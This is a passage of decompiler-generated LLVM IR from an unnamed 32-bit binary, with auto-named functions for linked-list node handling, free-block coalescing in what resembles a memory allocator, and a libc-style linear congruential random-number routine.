  %v1_1000851c = add i32 %v0_1000851c, 8
  %v2_1000851c = inttoptr i32 %v1_1000851c to i32*
  %v3_1000851c = load i32, i32* %v2_1000851c, align 4
  %v1_10008520 = add i32 %v0_1000851c, 4
  %v2_10008520 = inttoptr i32 %v1_10008520 to i32*
  %v3_10008520 = load i32, i32* %v2_10008520, align 4
  %v3_10008524 = icmp eq i32 %v3_1000851c, 0
  br i1 %v3_10008524, label %dec_label_pc_10008534, label %dec_label_pc_1000852c

dec_label_pc_1000852c:                            ; preds = %dec_label_pc_1000851c
  %v2_1000852c = add i32 %v3_1000851c, 4
  %v3_1000852c = inttoptr i32 %v2_1000852c to i32*
  store i32 %v3_10008520, i32* %v3_1000852c, align 4
  ret i32 %v2_100084d4

dec_label_pc_10008534:                            ; preds = %dec_label_pc_1000851c
  %v1_10008534 = load i32, i32* %r8.global-to-local, align 4
  %v2_10008534 = inttoptr i32 %v1_10008534 to i32*
  store i32 %v3_10008520, i32* %v2_10008534, align 4
  ret i32 %v2_100084d4

dec_label_pc_1000853c:                            ; preds = %dec_label_pc_100084fc
  %v2_1000853c = sub i32 %v2_100084d4, %v1_100084f0
  %v1_10008544 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008544 = inttoptr i32 %v1_10008544 to i32*
  store i32 %v2_1000853c, i32* %v2_10008544, align 4
  ret i32 %v1_100084f0

dec_label_pc_1000854c:                            ; preds = %dec_label_pc_100084d4
  %v1_1000854c = add i32 %v0_1000854c, 4
  %v2_1000854c = inttoptr i32 %v1_1000854c to i32*
  %v3_1000854c = load i32, i32* %v2_1000854c, align 4
  store i32 %v3_1000854c, i32* %r11.global-to-local, align 4
  %v3_10008550 = icmp eq i32 %v3_1000854c, 0
  br i1 %v3_10008550, label %dec_label_pc_10008550.dec_label_pc_10008558.loopexit_crit_edge, label %dec_label_pc_100084d4

dec_label_pc_10008550.dec_label_pc_10008558.loopexit_crit_edge: ; preds = %dec_label_pc_1000854c
  br label %dec_label_pc_10008558

dec_label_pc_10008558:                            ; preds = %dec_label_pc_100084c4, %dec_label_pc_10008550.dec_label_pc_10008558.loopexit_crit_edge, %dec_label_pc_100084e8, %dec_label_pc_100084f0
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1000854c, { 1, 2, 0 }
  uselistorder i32 %v0_1000851c, { 1, 0 }
  uselistorder i32 %v1_100084f0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_100084d4, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32 %v0_1000854c, { 0, 2, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10008558, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1000851c, { 1, 0 }
  uselistorder label %dec_label_pc_100084d4, { 1, 0 }
}

define i32 @function_10008560(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008560:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10008560 = icmp eq i32 %arg3, 0
  %v2_10008564 = add i32 %arg2, 4
  %v3_10008564 = inttoptr i32 %v2_10008564 to i32*
  store i32 %arg4, i32* %v3_10008564, align 4
  %v2_10008568 = add i32 %arg2, 8
  %v3_10008568 = inttoptr i32 %v2_10008568 to i32*
  store i32 %arg3, i32* %v3_10008568, align 4
  br i1 %v3_10008560, label %dec_label_pc_10008578, label %dec_label_pc_10008570

dec_label_pc_10008570:                            ; preds = %dec_label_pc_10008560
  %v2_10008570 = add i32 %arg3, 4
  %v3_10008570 = inttoptr i32 %v2_10008570 to i32*
  store i32 %arg2, i32* %v3_10008570, align 4
  br label %dec_label_pc_1000857c

dec_label_pc_10008578:                            ; preds = %dec_label_pc_10008560
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000857c

dec_label_pc_1000857c:                            ; preds = %dec_label_pc_10008570, %dec_label_pc_10008578
  %v3_1000857c = icmp eq i32 %arg4, 0
  %v0_10008580 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000857c, i32 %v0_10008580)
  %v2_10008584 = add i32 %arg4, 8
  %v3_10008584 = inttoptr i32 %v2_10008584 to i32*
  store i32 %arg2, i32* %v3_10008584, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1000857c, { 1, 0 }
}

define i32 @function_1000858c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000858c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000858c = icmp eq i32 %arg3, 0
  br i1 %v3_1000858c, label %dec_label_pc_1000859c, label %dec_label_pc_10008594

dec_label_pc_10008594:                            ; preds = %dec_label_pc_1000858c
  %v2_10008594 = add i32 %arg3, 4
  %v3_10008594 = inttoptr i32 %v2_10008594 to i32*
  store i32 %arg2, i32* %v3_10008594, align 4
  br label %dec_label_pc_100085a0

dec_label_pc_1000859c:                            ; preds = %dec_label_pc_1000858c
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100085a0

dec_label_pc_100085a0:                            ; preds = %dec_label_pc_10008594, %dec_label_pc_1000859c
  %v2_100085a0 = add i32 %arg2, 8
  %v3_100085a0 = inttoptr i32 %v2_100085a0 to i32*
  store i32 %arg3, i32* %v3_100085a0, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100085a0, { 1, 0 }
}

define i32 @function_100085a8(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100085a8:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_100085c0 = load i32, i32* %arg1, align 4
  store i32 %v2_100085c0, i32* @r31, align 4
  %v2_100085c4 = add i32 %arg3, %arg2
  store i32 %v2_100085c4, i32* %r3.global-to-local, align 4
  %v3_100085d87 = icmp eq i32 %v2_100085c0, 0
  %v1_100085dc8 = add i32 %v2_100085c0, 12
  %tmp69 = icmp uge i32 %v1_100085dc8, %arg2
  %or.cond10 = or i1 %v3_100085d87, %tmp69
  br i1 %or.cond10, label %dec_label_pc_100085e8, label %dec_label_pc_100085d0

dec_label_pc_100085d0:                            ; preds = %dec_label_pc_100085a8, %dec_label_pc_100085d0
  %v0_1000863011 = phi i32 [ %v3_100085d4, %dec_label_pc_100085d0 ], [ %v2_100085c0, %dec_label_pc_100085a8 ]
  store i32 %v0_1000863011, i32* %r11.global-to-local, align 4
  %v1_100085d4 = add i32 %v0_1000863011, 4
  %v2_100085d4 = inttoptr i32 %v1_100085d4 to i32*
  %v3_100085d4 = load i32, i32* %v2_100085d4, align 4
  store i32 %v3_100085d4, i32* @r31, align 4
  %v3_100085d8 = icmp eq i32 %v3_100085d4, 0
  %v1_100085dc = add i32 %v3_100085d4, 12
  %tmp6 = icmp uge i32 %v1_100085dc, %arg2
  %or.cond = or i1 %v3_100085d8, %tmp6
  br i1 %or.cond, label %dec_label_pc_100085e8, label %dec_label_pc_100085d0

dec_label_pc_100085e8:                            ; preds = %dec_label_pc_100085d0, %dec_label_pc_100085a8
  %v0_10008624.lcssa = phi i32 [ 0, %dec_label_pc_100085a8 ], [ %v0_1000863011, %dec_label_pc_100085d0 ]
  %v0_10008630.lcssa = phi i32 [ %v2_100085c0, %dec_label_pc_100085a8 ], [ %v3_100085d4, %dec_label_pc_100085d0 ]
  %v3_100085d8.lcssa = phi i1 [ %v3_100085d87, %dec_label_pc_100085a8 ], [ %v3_100085d8, %dec_label_pc_100085d0 ]
  br i1 %v3_100085d8.lcssa, label %dec_label_pc_100086a0, label %dec_label_pc_100085f0

dec_label_pc_100085f0:                            ; preds = %dec_label_pc_100085e8
  %v1_100085f0 = inttoptr i32 %v0_10008630.lcssa to i32*
  %v2_100085f0 = load i32, i32* %v1_100085f0, align 4
  %v2_100085f4 = sub i32 %v0_10008630.lcssa, %v2_100085f0
  %v1_100085f8 = add i32 %v2_100085f4, 12
  %v3_100085fc = icmp ugt i32 %v1_100085f8, %v2_100085c4
  br i1 %v3_100085fc, label %dec_label_pc_100086a0, label %dec_label_pc_10008604

dec_label_pc_10008604:                            ; preds = %dec_label_pc_100085f0
  %v4_100085fc = icmp eq i32 %v1_100085f8, %v2_100085c4
  %v2_10008608 = add i32 %v2_100085f0, %arg3
  store i32 %v2_10008608, i32* @r29, align 4
  br i1 %v4_100085fc, label %dec_label_pc_10008610, label %dec_label_pc_10008640

dec_label_pc_10008610:                            ; preds = %dec_label_pc_10008604
  %v3_10008610 = icmp eq i32 %v0_10008624.lcssa, 0
  br i1 %v3_10008610, label %dec_label_pc_10008694, label %dec_label_pc_10008618

dec_label_pc_10008618:                            ; preds = %dec_label_pc_10008610
  %v1_10008618 = add i32 %v0_10008624.lcssa, 12
  %v4_1000861c = icmp eq i32 %v1_10008618, %arg2
  br i1 %v4_1000861c, label %dec_label_pc_10008624, label %dec_label_pc_10008694

dec_label_pc_10008624:                            ; preds = %dec_label_pc_10008618
  %v1_10008624 = inttoptr i32 %v0_10008624.lcssa to i32*
  %v2_10008624 = load i32, i32* %v1_10008624, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000862c = add i32 %v0_10008624.lcssa, 8
  %v2_1000862c = inttoptr i32 %v1_1000862c to i32*
  %v3_1000862c = load i32, i32* %v2_1000862c, align 4
  %v2_10008634 = add i32 %v2_10008624, %v2_10008608
  store i32 %v2_10008634, i32* @r29, align 4
  %v5_10008638 = call i32 @function_1000858c(i32* %arg1, i32 %v0_10008630.lcssa, i32 %v3_1000862c, i32 %v2_100085c4)
  store i32 %v5_10008638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008694

dec_label_pc_10008640:                            ; preds = %dec_label_pc_10008604
  %v1_10008640 = add i32 %v0_10008630.lcssa, 4
  %v2_10008640 = inttoptr i32 %v1_10008640 to i32*
  %v3_10008640 = load i32, i32* %v2_10008640, align 4
  %v3_10008644 = icmp eq i32 %v3_10008640, 0
  br i1 %v3_10008644, label %dec_label_pc_1000867c, label %dec_label_pc_1000864c

dec_label_pc_1000864c:                            ; preds = %dec_label_pc_10008640
  %v1_1000864c = inttoptr i32 %v3_10008640 to i32*
  %v2_1000864c = load i32, i32* %v1_1000864c, align 4
  %v2_10008650 = sub i32 %v3_10008640, %v2_1000864c
  %v1_10008654 = add i32 %v2_10008650, 12
  %v4_10008658 = icmp eq i32 %v2_100085c4, %v1_10008654
  br i1 %v4_10008658, label %dec_label_pc_10008660, label %dec_label_pc_1000867c

dec_label_pc_10008660:                            ; preds = %dec_label_pc_1000864c
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000866c = add i32 %v2_1000864c, %v2_10008608
  store i32 %v2_1000866c, i32* @r29, align 4
  store i32 %v3_10008640, i32* @r31, align 4
  %v5_10008674 = call i32 @function_1000858c(i32* %arg1, i32 %v3_10008640, i32 %v0_10008624.lcssa, i32 %v2_100085c4)
  store i32 %v5_10008674, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008694

dec_label_pc_1000867c:                            ; preds = %dec_label_pc_1000864c, %dec_label_pc_10008640
  %v2_1000867c = add i32 %v0_10008630.lcssa, %arg3
  store i32 %v2_1000867c, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268469908, i32* @lr, align 4
  %v5_10008690 = call i32 @function_10008560(i32* %arg1, i32 %v2_1000867c, i32 %v0_10008624.lcssa, i32 %v3_10008640)
  store i32 %v5_10008690, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008694

dec_label_pc_10008694:                            ; preds = %dec_label_pc_10008618, %dec_label_pc_10008610, %dec_label_pc_10008660, %dec_label_pc_10008624, %dec_label_pc_1000867c
  %v0_10008694 = load i32, i32* @r31, align 4
  store i32 %v0_10008694, i32* @r30, align 4
  %v0_10008698 = load i32, i32* @r29, align 4
  %v2_10008698 = inttoptr i32 %v0_10008694 to i32*
  store i32 %v0_10008698, i32* %v2_10008698, align 4
  br label %dec_label_pc_100086bc

dec_label_pc_100086a0:                            ; preds = %dec_label_pc_100085f0, %dec_label_pc_100085e8
  %v2_100086a0 = add i32 %v2_100085c4, -12
  %v3_100086a0 = inttoptr i32 %v2_100086a0 to i32*
  store i32 %arg3, i32* %v3_100086a0, align 4
  %v0_100086a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_100086a4 = add i32 %v0_100086a4, -12
  store i32 %v1_100086a4, i32* @r30, align 4
  %v0_100086a8 = load i32, i32* %r11.global-to-local, align 4
  %v0_100086ac = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_100086ac, i32* %r3.global-to-local, align 4
  %v0_100086b0 = load i32, i32* @r31, align 4
  store i32 268469948, i32* @lr, align 4
  %v4_100086b8 = inttoptr i32 %v0_100086ac to i32*
  %v5_100086b8 = call i32 @function_10008560(i32* %v4_100086b8, i32 %v1_100086a4, i32 %v0_100086a8, i32 %v0_100086b0)
  store i32 %v5_100086b8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100086bc

dec_label_pc_100086bc:                            ; preds = %dec_label_pc_10008694, %dec_label_pc_100086a0
  %v0_100086c0 = load i32, i32* @r30, align 4
  store i32 %v0_100086c0, i32* %r3.global-to-local, align 4
  ret i32 %v0_100086c0

; uselistorder directives
  uselistorder i32 %v3_10008640, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_100085f8, { 1, 0 }
  uselistorder i32 %v0_10008630.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10008624.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_100085d4, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_100085c4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 10, 1, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_100086bc, { 1, 0 }
  uselistorder label %dec_label_pc_10008694, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_100085d0, { 1, 0 }
}

define i32 @function_100086d4() local_unnamed_addr {
dec_label_pc_100086d4:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_100086f0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_10010310.277 to i32), i32* @r29, align 4
  store i32 %v2_100086f0, i32* @r3, align 4
  %v0_10008704 = call i32 @function_100091fc()
  %v0_1000870c = call i32 @function_100091f4()
  %v2_10008714 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000871c = call i32 @function_100089b0(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 808) to i32*), i32 %v2_10008714)
  store i32 %v2_100086f0, i32* @r3, align 4
  %v0_10008728 = call i32 @function_100091fc()
  %v3_10008730 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10008730
}

define i32 @function_10008744(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008744:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010310.277 to i32), i32* %r29.global-to-local, align 4
  %v2_10008768 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10008768, i32* @r3, align 4
  %v0_10008770 = call i32 @function_100091fc()
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000877c = call i32 @function_100091f4()
  store i32 268470168, i32* @lr, align 4
  %v3_10008794 = call i32 @function_100088bc(i32 %arg1, i32* nonnull @global_var_10010328)
  %v1_1000879c = icmp slt i32 %v3_10008794, 0
  store i32 %v2_10008768, i32* @r3, align 4
  br i1 %v1_1000879c, label %dec_label_pc_100087ac, label %dec_label_pc_100087a8

dec_label_pc_100087a8:                            ; preds = %dec_label_pc_10008744
  store i32 ptrtoint (i32** @global_var_1001032c.281 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100087ac

dec_label_pc_100087ac:                            ; preds = %dec_label_pc_10008744, %dec_label_pc_100087a8
  %v0_100087ac = call i32 @function_100091fc()
  %v0_100087b4 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_100087b4

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100087ac, { 1, 0 }
}

define i32 @function_100087c8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100087c8:
  %stack_var_-56 = alloca i32, align 4
  %v2_100087d8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100087d8, i32* @r3, align 4
  %v0_10008800 = call i32 @function_100091fc()
  %v0_10008808 = call i32 @function_100091f4()
  store i32 %arg1, i32* @r3, align 4
  store i32 268470312, i32* @lr, align 4
  %v4_10008824 = inttoptr i32 %arg1 to i32*
  %v5_10008824 = call i32 @function_10008b24(i32* %v4_10008824, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_10010328 to i32))
  store i32 %v2_100087d8, i32* @r3, align 4
  %v0_10008830 = call i32 @function_100091fc()
  ret i32 ptrtoint (i32** @global_var_1001032c.281 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_10008850(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008850:
  %stack_var_-40 = alloca i32, align 4
  %v2_10008868 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10008868, i32* @r3, align 4
  %v0_10008880 = call i32 @function_100091fc()
  %v0_10008888 = call i32 @function_100091f4()
  store i32 ptrtoint (i32* @global_var_10010328 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268470428, i32* @lr, align 4
  %v0_10008898 = call i32 @function_10008a40()
  store i32 %v2_10008868, i32* @r3, align 4
  %v0_100088a4 = call i32 @function_100091fc()
  ret i32 %v0_100088a4

; uselistorder directives
  uselistorder i32* @global_var_10010328, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10010328 to i32), { 1, 0 }
}

define i32 @function_100088bc(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100088bc:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_100088bc = add i32 %tmp, 12
  %v2_100088bc = inttoptr i32 %v1_100088bc to i32*
  %v3_100088bc = load i32, i32* %v2_100088bc, align 4
  store i32 %v3_100088bc, i32* %r11.global-to-local, align 4
  %v0_100088c0 = load i32, i32* @lr, align 4
  store i32 %v0_100088c0, i32* %r0.global-to-local, align 4
  %v1_100088c8 = add i32 %arg1, 4
  store i32 %v1_100088c8, i32* %r3.global-to-local, align 4
  %v1_100088cc = add i32 %tmp, 8
  %v2_100088cc = inttoptr i32 %v1_100088cc to i32*
  %v3_100088cc = load i32, i32* %v2_100088cc, align 4
  store i32 %v3_100088cc, i32* %r9.global-to-local, align 4
  %v3_100088d0 = icmp eq i32 %v3_100088bc, 0
  br i1 %v3_100088d0, label %dec_label_pc_100088dc, label %dec_label_pc_100088e4

dec_label_pc_100088dc:                            ; preds = %dec_label_pc_100088bc
  %v2_100088dc = add i32 %v3_100088cc, -4
  %v3_100088dc = inttoptr i32 %v2_100088dc to i32*
  store i32 0, i32* %v3_100088dc, align 4
  br label %dec_label_pc_100088fc

dec_label_pc_100088e4:                            ; preds = %dec_label_pc_100088bc
  %v1_100088e4 = add i32 %tmp, 4
  %v2_100088e4 = inttoptr i32 %v1_100088e4 to i32*
  %v3_100088e4 = load i32, i32* %v2_100088e4, align 4
  %v2_100088e8 = sub i32 %v3_100088e4, %v3_100088cc
  %v4_100088ec = sdiv i32 %v2_100088e8, 4
  %v1_100088f0 = mul i32 %v4_100088ec, 5
  %v2_100088f4 = add i32 %v1_100088f0, %v3_100088bc
  store i32 %v2_100088f4, i32* %r0.global-to-local, align 4
  %v2_100088f8 = add i32 %v3_100088cc, -4
  %v3_100088f8 = inttoptr i32 %v2_100088f8 to i32*
  store i32 %v2_100088f4, i32* %v3_100088f8, align 4
  br label %dec_label_pc_100088fc

dec_label_pc_100088fc:                            ; preds = %dec_label_pc_100088dc, %dec_label_pc_100088e4
  %v0_100088fc = load i32, i32* %r3.global-to-local, align 4
  %v1_100088fc = add i32 %v0_100088fc, -4
  %v2_100088fc = inttoptr i32 %v1_100088fc to i32*
  %v3_100088fc = load i32, i32* %v2_100088fc, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f1e4.282 to i32), i32* %r9.global-to-local, align 4
  %v2_10008910 = srem i32 %v3_100088fc, 5
  store i32 %v2_10008910, i32* %r11.global-to-local, align 4
  %v2_1000891c = icmp ugt i32 %v2_10008910, 4
  %v1_10008920 = mul nsw i32 %v2_10008910, 4
  store i32 %v1_10008920, i32* %r0.global-to-local, align 4
  %v2_10008924 = add i32 %v1_10008920, ptrtoint (i32* @global_var_1000f1e4.282 to i32)
  store i32 %v2_10008924, i32* %r10.global-to-local, align 4
  br i1 %v2_1000891c, label %dec_label_pc_1000898c, label %dec_label_pc_10008930

dec_label_pc_10008930:                            ; preds = %dec_label_pc_100088fc
  %v3_10008928 = icmp eq i32 %v2_10008910, 0
  %v1_10008930 = add i32 %v1_10008920, add (i32 ptrtoint (i32* @global_var_1000f1e4.282 to i32), i32 20)
  %v2_10008930 = inttoptr i32 %v1_10008930 to i32*
  %v3_10008930 = load i32, i32* %v2_10008930, align 4
  store i32 %v3_10008930, i32* %r10.global-to-local, align 4
  %v3_10008934 = inttoptr i32 %v2_10008924 to i32*
  %v4_10008934 = load i32, i32* %v3_10008934, align 4
  store i32 %v4_10008934, i32* %r9.global-to-local, align 4
  store i32 %v2_10008910, i32* %v2_100088bc, align 4
  %v0_1000893c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000893c = mul i32 %v0_1000893c, 4
  store i32 %v1_1000893c, i32* %r0.global-to-local, align 4
  %v2_10008940 = add i32 %tmp, 16
  %v3_10008940 = inttoptr i32 %v2_10008940 to i32*
  store i32 %v0_1000893c, i32* %v3_10008940, align 4
  %v0_10008944 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008944 = add i32 %tmp, 20
  %v3_10008944 = inttoptr i32 %v2_10008944 to i32*
  store i32 %v0_10008944, i32* %v3_10008944, align 4
  %v0_10008948 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008948 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008948 = add i32 %v1_10008948, %v0_10008948
  store i32 %v2_10008948, i32* %r8.global-to-local, align 4
  br i1 %v3_10008928, label %dec_label_pc_10008980, label %dec_label_pc_10008950

dec_label_pc_10008950:                            ; preds = %dec_label_pc_10008930
  %v1_10008950 = add i32 %v0_10008948, -4
  %v2_10008950 = inttoptr i32 %v1_10008950 to i32*
  %v3_10008950 = load i32, i32* %v2_10008950, align 4
  %v1_10008954 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008954 = sdiv i32 %v3_10008950, %v1_10008954
  %v1_10008958 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008958 = add i32 %v1_10008958, %v2_10008954
  store i32 %v2_10008958, i32* %r9.global-to-local, align 4
  %v1_1000895c = mul i32 %v2_10008954, 4
  %v1_10008960 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008960 = sdiv i32 %v2_10008958, %v1_10008960
  store i32 %v2_10008960, i32* %r11.global-to-local, align 4
  %v2_10008964 = add i32 %v1_1000895c, %v0_10008948
  store i32 %v2_10008964, i32* %r0.global-to-local, align 4
  %v2_10008968 = add i32 %tmp, 4
  %v3_10008968 = inttoptr i32 %v2_10008968 to i32*
  store i32 %v2_10008964, i32* %v3_10008968, align 4
  %v0_1000896c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000896c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000896c = mul i32 %v1_1000896c, %v0_1000896c
  store i32 %v2_1000896c, i32* %r11.global-to-local, align 4
  %v1_10008970 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008970 = sub i32 %v1_10008970, %v2_1000896c
  %v1_10008974 = mul i32 %v2_10008970, 4
  %v0_10008978 = load i32, i32* %r3.global-to-local, align 4
  %v2_10008978 = add i32 %v1_10008974, %v0_10008978
  store i32 %v2_10008978, i32* %r9.global-to-local, align 4
  store i32 %v2_10008978, i32* %arg2, align 4
  %v0_10008980.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008980

dec_label_pc_10008980:                            ; preds = %dec_label_pc_10008930, %dec_label_pc_10008950
  %v0_10008980 = phi i32 [ %v2_10008948, %dec_label_pc_10008930 ], [ %v0_10008980.pre, %dec_label_pc_10008950 ]
  %v2_10008980 = add i32 %tmp, 24
  %v3_10008980 = inttoptr i32 %v2_10008980 to i32*
  store i32 %v0_10008980, i32* %v3_10008980, align 4
  %v0_10008984 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10008984, i32* %v2_100088cc, align 4
  %v0_100089a0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000899c

dec_label_pc_1000898c:                            ; preds = %dec_label_pc_100088fc
  %v0_1000898c = call i32 @function_10004e38()
  store i32 %v0_1000898c, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10008994 = inttoptr i32 %v0_1000898c to i32*
  store i32 22, i32* %v2_10008994, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000899c

dec_label_pc_1000899c:                            ; preds = %dec_label_pc_10008980, %dec_label_pc_1000898c
  %v0_100089a0 = phi i32 [ %v0_100089a0.pre, %dec_label_pc_10008980 ], [ -1, %dec_label_pc_1000898c ]
  store i32 %v0_100088c0, i32* %r0.global-to-local, align 4
  store i32 %v0_100089a0, i32* %r3.global-to-local, align 4
  ret i32 %v0_100089a0

; uselistorder directives
  uselistorder i32 %v0_100089a0, { 1, 0 }
  uselistorder i32 %v0_10008948, { 0, 2, 1 }
  uselistorder i32 %v0_1000893c, { 1, 0 }
  uselistorder i32 %v1_10008920, { 2, 1, 0 }
  uselistorder i32 %v2_10008910, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v3_100088cc, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 4, 0, 5, 3, 1, 2, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_1000899c, { 1, 0 }
  uselistorder label %dec_label_pc_10008980, { 1, 0 }
  uselistorder label %dec_label_pc_100088fc, { 1, 0 }
}

define i32 @function_100089b0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100089b0:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_100089b0 = add i32 %tmp, 12
  %v2_100089b0 = inttoptr i32 %v1_100089b0 to i32*
  %v3_100089b0 = load i32, i32* %v2_100089b0, align 4
  %v1_100089bc = add i32 %tmp, 8
  %v2_100089bc = inttoptr i32 %v1_100089bc to i32*
  %v3_100089bc = load i32, i32* %v2_100089bc, align 4
  store i32 %v3_100089bc, i32* %r7.global-to-local, align 4
  %v3_100089c0 = icmp eq i32 %v3_100089b0, 0
  br i1 %v3_100089c0, label %dec_label_pc_100089c8, label %dec_label_pc_100089e4

dec_label_pc_100089c8:                            ; preds = %dec_label_pc_100089b0
  %v1_100089c8 = inttoptr i32 %v3_100089bc to i32*
  %v2_100089c8 = load i32, i32* %v1_100089c8, align 4
  %v2_100089cc = mul i32 %v2_100089c8, 1103515245
  %v1_100089d0 = add i32 %v2_100089cc, 12345
  %v1_100089d4 = urem i32 %v1_100089d0, -2147483648
  store i32 %v1_100089d4, i32* %r9.global-to-local, align 4
  store i32 %v1_100089d4, i32* %v1_100089c8, align 4
  %v0_100089dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100089dc = inttoptr i32 %arg2 to i32*
  store i32 %v0_100089dc, i32* %v2_100089dc, align 4
  br label %dec_label_pc_10008a38

dec_label_pc_100089e4:                            ; preds = %dec_label_pc_100089b0
  %v2_100089e4 = load i32, i32* %arg1, align 4
  %v1_100089e8 = add i32 %tmp, 4
  %v2_100089e8 = inttoptr i32 %v1_100089e8 to i32*
  %v3_100089e8 = load i32, i32* %v2_100089e8, align 4
  store i32 %v3_100089e8, i32* %r9.global-to-local, align 4
  %v1_100089ec = add i32 %tmp, 24
